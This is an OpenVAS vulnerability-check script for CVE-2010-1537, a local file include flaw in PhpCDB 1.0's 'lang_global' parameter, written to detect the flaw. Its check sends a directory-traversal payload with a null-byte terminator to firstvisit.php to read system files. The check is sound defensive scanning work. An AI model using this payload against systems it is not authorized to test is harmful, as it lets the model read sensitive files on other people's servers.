###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_PhpCDB_38507.nasl 14326 2019-03-19 13:40:32Z jschulte $
#
# PhpCDB 'lang_global' Parameter Multiple Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100516");
  script_version("$Revision: 14326 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:40:32 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-03-04 12:28:05 +0100 (Thu, 04 Mar 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2010-1537");
  script_bugtraq_id(38507);

  script_name("PhpCDB 'lang_global' Parameter Multiple Local File Include Vulnerabilities");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38507");
  script_xref(name:"URL", value:"http://sourceforge.net/projects/phpcdb/");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"PhpCDB is prone to multiple local file-include vulnerabilities because
it fails to properly sanitize user-supplied input.

An attacker can exploit these vulnerabilities to obtain
potentially sensitive information and execute arbitrary local
scripts in the context of the webserver process. This may allow
the attacker to compromise the application and the computer, other
attacks are also possible.

PhpCDB 1.0 is vulnerable, other versions may also be affected.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

files = traversal_files();

foreach dir( make_list_unique( "/phpcdb", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file (keys(files)) {

    url = string(dir,"/firstvisit.php?lang_global=../../../../../../../../../",files[file],"%00");

    if(http_vuln_check(port:port, url:url,pattern:file)) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
